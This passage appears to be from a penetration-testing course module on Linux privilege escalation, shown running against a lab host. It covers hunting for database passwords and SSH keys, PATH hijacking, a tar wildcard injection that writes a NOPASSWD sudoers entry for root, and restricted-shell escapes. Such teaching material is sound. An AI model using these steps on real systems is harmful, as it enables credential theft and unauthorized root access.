root         <span class="hljs-number">889</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0.5</span> <span class="hljs-number">126676</span> <span class="hljs-number">22888</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-<span class="hljs-keyword">for</span>-signal
root         <span class="hljs-number">906</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span> <span class="hljs-number">248244</span>  <span class="hljs-number">8736</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/gdm3
root        <span class="hljs-number">1137</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span> <span class="hljs-number">252436</span>  <span class="hljs-number">9424</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">upower</span>/<span class="hljs-title">upowerd</span></span>
root        <span class="hljs-number">1257</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.4</span> <span class="hljs-number">293736</span> <span class="hljs-number">16316</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">packagekit</span>/<span class="hljs-title">packagekitd</span></span>
</code></pre>
<hr>
<p>This would give us a pretty good overview of our target system, so we can go into more detail next and figure out the individual permissions for the components we found.</p>
<h2 id="credential-hunting">Credential Hunting</h2>
<hr>
<p>When enumerating a system, it is important to note down any credentials. These may be found in configuration files (<code>.conf</code>, <code>.config</code>, <code>.xml</code>, etc.), shell scripts, a user&#39;s bash history file, backup (<code>.bak</code>) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.</p>
<p>The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:</p>
<p>Credential Hunting</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ cat wp<span class="hljs-params">-config.php</span> | grep <span class="hljs-string">'DB_USER\|DB_PASSWORD'</span>

<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'wordpressuser'</span> );
<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'WPadmin123!'</span> );
</code></pre>
<p>The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).</p>
<p>Credential Hunting</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$  find / ! -path <span class="hljs-string">"*/proc/*"</span> -iname <span class="hljs-string">"*config*"</span> -type f <span class="hljs-number">2</span>&gt;<span class="hljs-meta-keyword">/dev/</span>null

<span class="hljs-meta-keyword">/etc/</span>ssh/ssh_config
<span class="hljs-meta-keyword">/etc/</span>ssh/sshd_config
<span class="hljs-meta-keyword">/etc/</span>python3/debian_config
<span class="hljs-meta-keyword">/etc/</span>kbd/config
<span class="hljs-meta-keyword">/etc/</span>manpath.config
<span class="hljs-meta-keyword">/boot/</span>config<span class="hljs-number">-4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-116</span>-generic
<span class="hljs-meta-keyword">/boot/</span>grub<span class="hljs-meta-keyword">/i386-pc/</span>configfile.mod
<span class="hljs-meta-keyword">/sys/</span>devices/pci0000:<span class="hljs-number">00</span>/<span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.0</span>/config
<span class="hljs-meta-keyword">/sys/</span>devices/pci0000:<span class="hljs-number">00</span>/<span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01.0</span>/config
<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<hr>
<h3 id="ssh-keys">SSH Keys</h3>
<p>It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the <code>known_hosts</code> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.</p>
<p>Credential Hunting</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$  ls ~/<span class="hljs-selector-class">.ssh</span>

id_rsa  id_rsa<span class="hljs-selector-class">.pub</span>  known_hosts
</code></pre>
<h2 id="path-abuse">Path Abuse</h2>
<hr>
<p><a href="http://www.linfo.org/path\_env\_var.html">PATH</a> is an environment variable that specifies the set of directories where an executable can be located. An account&#39;s PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type <code>cat /tmp/test.txt</code> instead of specifying the absolute path <code>/bin/cat /tmp/test.txt</code>. We can check the contents of the PATH variable by typing <code>env | grep PATH</code> or <code>echo $PATH</code>.</p>
<p>Path Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-meta">@NIX</span><span class="hljs-number">02:</span>~$ echo $PATH

<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/sbin:/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>local/games
</code></pre>
<p>Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.</p>
<p>Path Abuse</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">htb_student@NIX02:</span>~$ pwd &amp;&amp; conncheck 

/usr/local/sbin
Active Internet connections (servers <span class="hljs-keyword">and</span> established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">22</span>              <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:*               LISTEN      <span class="hljs-number">1189</span>/sshd       
tcp        <span class="hljs-number">0</span>     <span class="hljs-number">88</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.2</span><span class="hljs-meta">.12</span>:<span class="hljs-number">22</span>          <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.3</span>:<span class="hljs-number">43218</span>        ESTABLISHED <span class="hljs-number">1614</span>/sshd: mrb3n [p
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN      <span class="hljs-number">1189</span>/sshd       
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      <span class="hljs-number">1304</span>/apache2
</code></pre>
<p>As shown below, the <code>conncheck</code> script created in <code>/usr/local/sbin</code> will still run when in the <code>/tmp</code> directory because it was created in a directory specified in the PATH.</p>
<p>Path Abuse</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">htb_student@NIX02:</span>~$ pwd &amp;&amp; conncheck 

/tmp
Active Internet connections (servers <span class="hljs-keyword">and</span> established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">22</span>              <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:*               LISTEN      <span class="hljs-number">1189</span>/sshd       
tcp        <span class="hljs-number">0</span>    <span class="hljs-number">268</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.2</span><span class="hljs-meta">.12</span>:<span class="hljs-number">22</span>          <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.3</span>:<span class="hljs-number">43218</span>        ESTABLISHED <span class="hljs-number">1614</span>/sshd: mrb3n [p
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN      <span class="hljs-number">1189</span>/sshd       
tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      <span class="hljs-number">1304</span>/apache2
</code></pre>
<p>Adding <code>.</code> to a user&#39;s PATH adds their current working directory to the list. For example, if we can modify a user&#39;s path, we could replace a common binary such as <code>ls</code> with a malicious script such as a reverse shell. If we add <code>.</code> to the path by issuing the command <code>PATH=.:$PATH</code> and then <code>export PATH</code>, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing <code>ls</code> will call the malicious script named <code>ls</code> in the current working directory instead of the binary located at <code>/bin/ls</code>).</p>
<p>Path Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-meta">@NIX</span><span class="hljs-number">02:</span>~$ echo $PATH

<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/sbin:/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>local/games
</code></pre>
<p>Path Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>PATH=.<span class="hljs-symbol">:</span><span class="hljs-variable">${</span>PATH}
htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>export PATH
htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-variable">$PATH</span>

.<span class="hljs-symbol">:/usr/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/local/games</span>
</code></pre>
<p>In this example, we modify the path to run a simple <code>echo</code> command when the command <code>ls</code> is typed.</p>
<p>Path Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>touch ls
htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">'echo "PATH ABUSE!!"'</span> &gt; ls
htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +x ls
</code></pre>
<p>Path Abuse</p>
<pre><code class="lang-shell-session">htb_student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls

PATH ABUSE!!
</code></pre>
<h2 id="wildcard-abuse">Wildcard Abuse</h2>
<hr>
<p>A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:</p>
<table>
<thead>
<tr>
<th><strong>Character</strong></th>
<th><strong>Significance</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>An asterisk that can match any number of characters in a file name.</td>
</tr>
<tr>
<td><code>?</code></td>
<td>Matches a single character.</td>
</tr>
<tr>
<td><code>[ ]</code></td>
<td>Brackets enclose characters and can match any single one at the defined position.</td>
</tr>
<tr>
<td><code>~</code></td>
<td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user&#39;s home directory.</td>
</tr>
<tr>
<td><code>-</code></td>
<td>A hyphen within brackets will denote a range of characters.</td>
</tr>
</tbody>
</table>
<p>An example of how wildcards can be abused for privilege escalation is the <code>tar</code> command, a common program for creating/extracting archives. If we look at the <a href="http://man7.org/linux/man-pages/man1/tar.1.html">man page</a> for the <code>tar</code> command, we see the following:</p>
<p>Wildcard Abuse</p>
<pre><code class="lang-shell-session">htb_student@NIX02:~$ man tar

&lt;SNIP&gt;
Informative output
       <span class="hljs-comment">--checkpoint[=N]</span>
              Display progress messages <span class="hljs-keyword">every</span> Nth <span class="hljs-built_in">record</span> (default <span class="hljs-number">10</span>).

       <span class="hljs-comment">--checkpoint-action=ACTION</span>
              Run ACTION <span class="hljs-keyword">on</span> each checkpoint.
</code></pre>
<p>The <code>--checkpoint-action</code> option permits an <code>EXEC</code> action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=sh root.sh</code> is passed to <code>tar</code> as command-line options. Let&#39;s see this in practice.</p>
<p>Consider the following cron job, which is set up to back up the <code>/home/htb-student</code> directory&#39;s contents and create a compressed archive within <code>/home/htb-student</code>. The cron job is set to run every minute, so it is a good candidate for privilege escalation.</p>
<p>Wildcard Abuse</p>
<pre><code class="lang-shell-session"><span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
mh dom mon dow command
*<span class="hljs-regexp">/01 * * * * cd /</span>home<span class="hljs-regexp">/htb-student &amp;&amp; tar -zcf /</span>home<span class="hljs-regexp">/htb-student/</span>backup.tar.gz *
</code></pre>
<p>We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.</p>
<p>Wildcard Abuse</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">'echo "htb-student ALL=(root) NOPASSWD: ALL" &gt;&gt; /etc/sudoers'</span> &gt; root.sh
htb-student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">""</span> &gt; <span class="hljs-string">"--checkpoint-action=exec=sh root.sh"</span>
htb-student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">""</span> &gt; --checkpoint=<span class="hljs-number">1</span>
</code></pre>
<p>We can check and see that the necessary files were created.</p>
<p>Wildcard Abuse</p>
<pre><code class="lang-shell-session">htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt<span class="hljs-number"> 10 </span>root        root       <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>23:12 .
drwxr-xr-x<span class="hljs-number"> 24 </span>root        root       <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>02:24 ..
-rw-r--r-- <span class="hljs-number"> 1 </span>root        root        <span class="hljs-number"> 378 </span>Aug<span class="hljs-number"> 31 </span>23:12 backup.tar.gz
-rw-rw-r-- <span class="hljs-number"> 1 </span>htb-student htb-student   <span class="hljs-number"> 1 </span>Aug<span class="hljs-number"> 31 </span>23:11 --checkpoint=1
-rw-rw-r-- <span class="hljs-number"> 1 </span>htb-student htb-student   <span class="hljs-number"> 1 </span>Aug<span class="hljs-number"> 31 </span>23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt <span class="hljs-number"> 2 </span>root        root       <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>22:36 .font-unix
drwxrwxrwt <span class="hljs-number"> 2 </span>root        root       <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 31 </span>22:36 .ICE-unix
-rw-rw-r-- <span class="hljs-number"> 1 </span>htb-student htb-student  <span class="hljs-number"> 60 </span>Aug<span class="hljs-number"> 31 </span>23:11 root.sh
</code></pre>
<p>Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.</p>
<p>Wildcard Abuse</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-variable">@NIX02</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l

Matching Defaults entries <span class="hljs-keyword">for</span> htb-student on <span class="hljs-symbol">NIX02:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User htb-student may run the following commands on <span class="hljs-symbol">NIX02:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> ALL
</code></pre>
<h2 id="escaping-restricted-shells">Escaping Restricted Shells</h2>
<hr>
<p>A restricted shell is a type of shell that limits the user&#39;s ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the <code>rbash</code> shell in Linux and the &quot;Restricted-access Shell&quot; in Windows.</p>
<p><strong>RBASH</strong></p>
<p><a href="https://www.gnu.org/software/bash/manual/html\_node/The-Restricted-Shell.html">Restricted Bourne shell</a> (<code>rbash</code>) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user&#39;s ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.</p>
<p><strong>RKSH</strong></p>
<p><a href="https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command">Restricted Korn shell</a> (<code>rksh</code>) is a restricted version of the Korn shell, another standard command-line interpreter. The <code>rksh</code> shell limits the user&#39;s ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.</p>
<p><strong>RZSH</strong></p>
<p><a href="https://manpages.debian.org/experimental/zsh/rzsh.1.en.html">Restricted Z shell</a> (<code>rzsh</code>) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The <code>rzsh</code> shell limits the user&#39;s ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.</p>
<p>For example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user&#39;s ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network&#39;s security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.</p>
<p>Imagine a company with a network of Linux servers hosting critical business applications and services. Many users, including employees, contractors, and external partners, access the network. To protect the security and integrity of the network, the organization&#39;s IT team decided to implement restricted shells for all users.</p>
<p>To do this, the IT team sets up several <code>rbash</code>, <code>rksh</code>, and <code>rzsh</code> shells on the network and assigns each user to a specific shell. For example, external partners who need to access only certain network features, such as email and file sharing, are assigned to <code>rbash</code> shells, which limits their ability to execute specific commands and access certain directories. Contractors who need to access more advanced network features, such as database servers and web servers, are assigned to <code>rksh</code> shells, which provide them with more flexibility but still limit their abilities. Finally, employees who need to access the network for specific purposes, such as to run specific applications or scripts, are assigned to <code>rzsh</code> shells, which provide them with the most flexibility but still limit their ability to execute specific commands and access certain directories.</p>
<p>Several methods can be used to escape from a restricted shell. Some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. Here are a few examples of methods that can be used to escape from a restricted shell.</p>
<hr>
<h3 id="escaping">Escaping</h3>
<p>In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts. For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command. In that case, it may be possible to escape from the shell by injecting additional commands into the argument.</p>
<p><strong>Command injection</strong></p>
<p>Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the <code>ls</code> command. Unfortunately, the shell only allows us to execute the <code>ls</code> command with a specific set of arguments, such as <code>ls -l</code> or <code>ls -a</code>, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the <code>ls</code> command.</p>
<p>For example, we could use the following command to inject a <code>pwd</code> command into the argument of the <code>ls</code> command:</p>
<p>Escaping Restricted Shells</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">ls</span> -l <span class="hljs-string">`pwd`</span>
</code></pre>
<p>This command would cause the <code>ls</code> command to be executed with the argument <code>-l</code>, followed by the output of the <code>pwd</code> command. Since the <code>pwd</code> command is not restricted by the shell, this would allow us to execute the <code>pwd</code> command and see the current working directory, even though the shell does not allow us to execute the <code>pwd</code> command directly.</p>
<p><strong>Command Substitution</strong></p>
<p>Another method for escaping from a restricted shell is to use command substitution. This involves using the shell&#39;s command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.</p>
<p><strong>Command Chaining</strong></p>
<p>In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (<code>;</code>) or a vertical bar (<code>|</code>), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.</p>
<p><strong>Environment Variables</strong></p>
<p>For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.</p>
<p><strong>Shell Functions</strong></p>
<p>In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.</p>
<h2 id="special-permissions">Special Permissions</h2>
<hr>
<p>The <code>Set User ID upon Execution</code> (<code>setuid</code>) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The <code>setuid</code> bit appears as an <code>s</code>.</p>
<p>Special Permissions</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null

-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16728 </span>Sep <span class="hljs-number"> 1 </span>19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16728 </span>Sep <span class="hljs-number"> 1 </span>22:05 /home/mrb3n/payroll
-rwSr--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 31 </span>02:51 /home/cliff.moore/netracer
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 40152 </span>Nov<span class="hljs-number"> 30 </span><span class="hljs-number"> 2017 </span>/bin/mount
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 40128 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/bin/su
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 27608 </span>Nov<span class="hljs-number"> 30 </span><span class="hljs-number"> 2017 </span>/bin/umount
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 44680 </span>May <span class="hljs-number"> 7 </span><span class="hljs-number"> 2014 </span>/bin/ping6
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 30800 </span>Jul<span class="hljs-number"> 12 </span><span class="hljs-number"> 2016 </span>/bin/fusermount
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 44168 </span>May <span class="hljs-number"> 7 </span><span class="hljs-number"> 2014 </span>/bin/ping
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 142032 </span>Jan<span class="hljs-number"> 28 </span><span class="hljs-number"> 2017 </span>/bin/ntfs-3g
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 38984 </span>Jun<span class="hljs-number"> 14 </span><span class="hljs-number"> 2017 </span>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr--<span class="hljs-number"> 1 </span>root messagebus<span class="hljs-number"> 42992 </span>Jan<span class="hljs-number"> 12 </span><span class="hljs-number"> 2017 </span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 14864 </span>Jan<span class="hljs-number"> 18 </span><span class="hljs-number"> 2016 </span>/usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 85832 </span>Nov<span class="hljs-number"> 30 </span><span class="hljs-number"> 2017 </span>/usr/lib/snapd/snap-confine
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 428240 </span>Jan<span class="hljs-number"> 18 </span><span class="hljs-number"> 2018 </span>/usr/lib/openssh/ssh-keysign
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 10232 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2017 </span>/usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 23376 </span>Jan<span class="hljs-number"> 18 </span><span class="hljs-number"> 2016 </span>/usr/bin/pkexec
-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 240 </span>Feb <span class="hljs-number"> 1 </span><span class="hljs-number"> 2016 </span>/usr/bin/facter
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 39904 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/newgrp
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 32944 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/newuidmap
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 49584 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/chfn
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 136808 </span>Jul <span class="hljs-number"> 4 </span><span class="hljs-number"> 2017 </span>/usr/bin/sudo
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 40432 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/chsh
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 32944 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/newgidmap
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 75304 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/gpasswd
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 54256 </span>May<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>/usr/bin/passwd
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 10624 </span>May <span class="hljs-number"> 9 </span><span class="hljs-number"> 2018 </span>/usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1588768 </span>Aug<span class="hljs-number"> 31 </span>00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 94240 </span>Jun <span class="hljs-number"> 9 </span>14:54 /sbin/mount.nfs
</code></pre>
<p>It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the <code>setuid</code> bit is set on them, these can be used for our purpose.</p>
<p>The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: <code>find / -uid 0 -perm -6000 -type f 2&gt;/dev/null</code>. These files can be leveraged in the same manner as <code>setuid</code> binaries to escalate privileges.</p>
<p>Special Permissions</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ find /</span> -user root -perm -<span class="hljs-number">6000</span> -exec ls -ldb {} \; <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>

-rwsr-sr-x <span class="hljs-number">1</span> root root <span class="hljs-number">85832</span> Nov <span class="hljs-number">30</span>  <span class="hljs-number">2017</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">snapd</span>/<span class="hljs-title">snap</span>-<span class="hljs-title">confine</span></span>
</code></pre>
<p>This <a href="https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits">resource</a> has more information about the <code>setuid</code> and <code>setgid</code> bits, including how to set the bits.</p>
<hr>
<h3 id="gtfobins">GTFOBins</h3>
<p>The <a href="https://gtfobins.github.io/">GTFOBins</a> project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program&#39;s features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, <code>apt-get</code> can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:</p>
<p>Special Permissions</p>
